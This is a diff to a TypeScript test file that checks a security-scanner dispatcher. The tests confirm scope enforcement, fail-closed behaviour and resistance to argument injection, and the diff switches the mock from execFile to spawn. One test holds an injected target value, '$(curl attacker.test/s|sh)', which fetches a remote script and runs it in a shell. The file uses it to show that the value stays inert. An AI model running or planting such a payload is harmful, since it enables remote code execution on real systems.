@@ -5,28 +5,36 @@
  * with array args stops shell injection but not a flag-shaped substituted
  * value being reparsed by the tool's own arg parser).
  *
- * child_process.execFile is mocked via promisify.custom (same technique as
- * the RCE-stopgap tests) so every real command dispatchTool would issue is
- * directly observable, and ScopeGuard is mocked so scope decisions are
- * deterministic per test case.
+ * child_process.spawn is mocked with a fake EventEmitter-based child process
+ * (dispatchTool uses spawn(), not execFile — see dispatch-tool.ts's
+ * execFileNoStdin() comment: execFile's inherited stdin made nuclei hang
+ * forever in a live Phase 3 test, confirmed by reproducing it standalone) so
+ * every real command dispatchTool would issue is directly observable, and
+ * ScopeGuard is mocked so scope decisions are deterministic per test case.
  */
 import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { EventEmitter } from 'events';
 
-const { execFileImpl, isInScopeMock } = vi.hoisted(() => ({
-  execFileImpl: vi.fn(async (_bin: string, _args: string[]) => ({ stdout: 'ok', stderr: '' })),
+const { spawnImpl, isInScopeMock } = vi.hoisted(() => ({
+  spawnImpl: vi.fn((_bin: string, _args: string[], _opts: any) => ({ stdout: 'ok', stderr: '', code: 0 })),
   isInScopeMock: vi.fn(),
 }));
 
 vi.mock('child_process', () => {
-  function execFile(bin: string, args: string[], optsOrCb: any, cb?: any) {
-    const callback = typeof optsOrCb === 'function' ? optsOrCb : cb;
-    execFileImpl(bin, args).then(
-      (r: any) => callback(null, r.stdout, r.stderr),
-      (e: any) => callback(e),
-    );
+  function spawn(bin: string, args: string[], opts: any) {
+    const child: any = new EventEmitter();
+    child.stdout = new EventEmitter();
+    child.stderr = new EventEmitter();
+    const { stdout, stderr, code } = spawnImpl(bin, args, opts);
+    queueMicrotask(() => {
+      if (stdout) child.stdout.emit('data', Buffer.from(stdout));
+      if (stderr) child.stderr.emit('data', Buffer.from(stderr));
+      child.emit('close', code);
+    });
+    child.kill = vi.fn();
+    return child;
   }
-  (execFile as any)[Symbol.for('nodejs.util.promisify.custom')] = execFileImpl;
-  return { execFile };
+  return { spawn };
 });
 
 vi.mock('../middleware/scopeGuard', () => ({
@@ -46,7 +54,7 @@ import {
 const PROGRAM_ID = 101;
 
 beforeEach(() => {
-  execFileImpl.mockClear();
+  spawnImpl.mockClear();
   isInScopeMock.mockReset();
 });
 
@@ -59,7 +67,7 @@ describe('dispatchTool — adversarial set', () => {
       args: ['-sV', '{domain}'],
       programId: PROGRAM_ID,
     });
-    expect(execFileImpl).toHaveBeenCalledWith('nmap', ['-sV', 'example.com'], expect.any(Object));
+    expect(spawnImpl).toHaveBeenCalledWith('nmap', ['-sV', 'example.com'], expect.any(Object));
     expect(result.stdout).toBe('ok');
   });
 
@@ -71,7 +79,7 @@ describe('dispatchTool — adversarial set', () => {
       args: ['-sV', '{domain}'],
       programId: PROGRAM_ID,
     })).rejects.toThrow(ToolOutOfScopeError);
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('3. excluded subdomain of an in-scope wildcard → blocked, never exec\'d', async () => {
@@ -85,7 +93,7 @@ describe('dispatchTool — adversarial set', () => {
       args: ['-h', '{url}'],
       programId: PROGRAM_ID,
     })).rejects.toThrow(ToolOutOfScopeError);
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('4. guard throws → fail closed, never exec\'d', async () => {
@@ -96,7 +104,7 @@ describe('dispatchTool — adversarial set', () => {
       args: ['-u', '{url}', '--batch'],
       programId: PROGRAM_ID,
     })).rejects.toThrow('DB connection lost');
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('5. a target containing shell metacharacters → passed as a single execFile arg, never interpreted', async () => {
@@ -113,8 +121,8 @@ describe('dispatchTool — adversarial set', () => {
     // concatenated into a string a shell could parse. (new URL() percent-
     // encodes the literal space, but leaves $()| untouched — still inert,
     // since execFile never invokes a shell to interpret them either way.)
-    expect(execFileImpl).toHaveBeenCalledTimes(1);
-    const [bin, args] = execFileImpl.mock.calls[0];
+    expect(spawnImpl).toHaveBeenCalledTimes(1);
+    const [bin, args] = spawnImpl.mock.calls[0];
     expect(bin).toBe('whatweb');
     expect(args).toHaveLength(1);
     expect(args[0]).toContain('$(curl%20attacker.test/s|sh)');
@@ -133,7 +141,7 @@ describe('dispatchTool — adversarial set', () => {
       args: ['{domain}', '--batch'],
       programId: PROGRAM_ID,
     })).rejects.toThrow(ToolArgumentInjectionError);
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('7. malformed target → ScopeGuard fails closed on it, never reaches exec (real isInScope already handles this — case 7 of scope-egress-chokepoint.test.ts)', async () => {
@@ -145,7 +153,7 @@ describe('dispatchTool — adversarial set', () => {
       programId: PROGRAM_ID,
     });
     await expect(result).rejects.toThrow(ToolOutOfScopeError);
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('7b. dispatchTool\'s OWN URL validation is defense-in-depth, not just a pass-through of ScopeGuard\'s: a garbage target the guard (hypothetically) approves still gets rejected before exec', async () => {
@@ -157,7 +165,7 @@ describe('dispatchTool — adversarial set', () => {
       programId: PROGRAM_ID,
     });
     await expect(result).rejects.toThrow(ToolTargetInvalidError);
-    expect(execFileImpl).not.toHaveBeenCalled();
+    expect(spawnImpl).not.toHaveBeenCalled();
   });
 
   it('literal (non-placeholder) args pass through untouched, including ones starting with "-"', async () => {
@@ -168,6 +176,6 @@ describe('dispatchTool — adversarial set', () => {
       args: ['-u', '{url}', '-severity', 'high,critical', '-silent'],
       programId: PROGRAM_ID,
     });
-    expect(execFileImpl).toHaveBeenCalledWith('nuclei', ['-u', 'https://example.com/', '-severity', 'high,critical', '-silent'], expect.any(Object));
+    expect(spawnImpl).toHaveBeenCalledWith('nuclei', ['-u', 'https://example.com/', '-severity', 'high,critical', '-silent'], expect.any(Object));
   });
 });
